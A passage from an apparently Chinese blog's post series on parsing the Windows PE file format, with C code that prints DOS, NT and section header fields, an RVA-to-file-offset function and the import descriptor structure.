<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">//MS-DOS</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token comment">//PE</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token comment">//_IMAGE_NT_HEADERS</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	PIMAGE_NT_HEADERS ReadNTHeaders<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	ReadNTHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE标志位：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>Signature<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"运行平台：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>Machine<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImageBase：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213075943206.png" alt="image-20220213075943206" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件结构解析之区段表与数据目录导入表解析</title>
    <url>/article/d979d2ac.html</url>
    <content><![CDATA[<p>hvv 招人了，给我这种菜🐕🐕一点机会吧 awa！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226143047497.png" alt="image-20220226143047497" /></p>
<h1 id="区段表结构解析及遍历"><a class="anchor" href="#区段表结构解析及遍历">#</a> 区段表结构解析及遍历</h1>
<h2 id="运行程序代码"><a class="anchor" href="#运行程序代码">#</a> 运行程序代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">//MS-DOS</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token comment">//PE</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token comment">//_IMAGE_NT_HEADERS</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	PIMAGE_NT_HEADERS ReadNTHeaders<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	ReadNTHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE标志位：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>Signature<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"运行平台：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>Machine<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImageBase：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token comment">// 区段解析遍历</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Section Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	PIMAGE_SECTION_HEADER ReadSectionHeader <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>ReadNTHeaders<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	PIMAGE_FILE_HEADER pFileHeader <span class="token operator">=</span> <span class="token operator">&amp;</span>ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pFileHeader<span class="token operator">-></span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name(区段名称)：%s\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"VOffset(起始的相对虚拟地址)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"VSize(区段大小)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ROffset(文件偏移)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RSize(文件中的区段大小)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"标记(区段的属性)：%08X\n\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226102347066.png" alt="image-20220226102347066" /></p>
<h1 id="数据目录表结构与地址转换函数"><a class="anchor" href="#数据目录表结构与地址转换函数">#</a> 数据目录表结构与地址转换函数</h1>
<h2 id="数据目录"><a class="anchor" href="#数据目录">#</a> 数据目录</h2>
<p>VS 中查看 <code>_IMAGE_DATA_DIRECTORY</code> ，查看数据目录表结构</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DATA_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   Size<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_DATA_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span>    <span class="token expression"><span class="token number">16</span></span></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226112153373.png" alt="image-20220226112153373" /></p>
<ul>
<li>
<p>VirtualAddress：虚拟地址，而就是数据目录表的起始位置</p>
</li>
<li>
<p>Size：尺寸</p>
</li>
<li>
<p>VirtualAddress + Size：结束地址</p>
</li>
</ul>
<p>数据目录表存在一定的顺序，在 VS 中通过查看 <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> ，查看数据目录表结构顺序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226112813147.png" alt="image-20220226112813147" /></p>
<p>通过 PE ditor 打开查看数据目录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226111903077.png" alt="image-20220226111903077" /></p>
<h2 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 计算数据目录表起始位置到文件头的偏移</span></pre></td></tr><tr><td data-num="2"></td><td><pre>DWORD <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>DWORD dwRva<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>DWORD <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>DWORD dwRva<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">//dwRva 是某个数据目录表的 VirtualAddress</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//buffer 是读取到的 PE 文件缓冲区</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">// 区段表</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_SECTION_HEADER pSection <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>pNt<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token comment">// 判断是否落在了头部当中</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRva <span class="token operator">&lt;</span> pSection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">return</span> dwRva<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token comment">//VirtualAddress：虚拟地址，而就是数据目录表的起始位置</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token comment">//Size：尺寸</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token comment">//VirtualAddress + Size：结束地址</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token comment">// 判断是否落在某个区段内</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pNt<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRva <span class="token operator">>=</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">&amp;&amp;</span> dwRva <span class="token operator">&lt;=</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>			<span class="token comment">//dwRva - pSection [i].VirtualAddress 是数据目录表到区段的起始地址的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="29"></td><td><pre>			<span class="token comment">//pSection [i].PointerToRawData 区段到文件头的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="30"></td><td><pre>			<span class="token keyword">return</span> dwRva <span class="token operator">-</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>			<span class="token comment">// 返回的是数据目录表到文件头的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="导入表结构解析"><a class="anchor" href="#导入表结构解析">#</a> 导入表结构解析</h1>
<p>导入表结构</p>
<ul>
<li><code>_IMAGE_IMPORT_DESCRIPTOR</code></li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD   Characteristics<span class="token punctuation">;</span>            <span class="token comment">// 0 for terminating null import descriptor</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        DWORD   OriginalFirstThunk<span class="token punctuation">;</span>         <span class="token comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span>                  <span class="token comment">// 0 if not bound,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                                            <span class="token comment">// -1 if bound, and real date\time stamp</span></pre></td></tr><tr><td data-num="8"></td><td><pre>                                            <span class="token comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>                                            <span class="token comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD   ForwarderChain<span class="token punctuation">;</span>                 <span class="token comment">// -1 if no forwarders</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD   Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    DWORD   FirstThunk<span class="token punctuation">;</span>                     <span class="token comment">// RVA to IAT (if bound this IAT has actual addresses)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span class="token operator">*</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226115958511.png" alt="image-20220226115958511" /></p>
<ul>
<li>_IMAGE_THUNK_DATA32</li>
</ul>
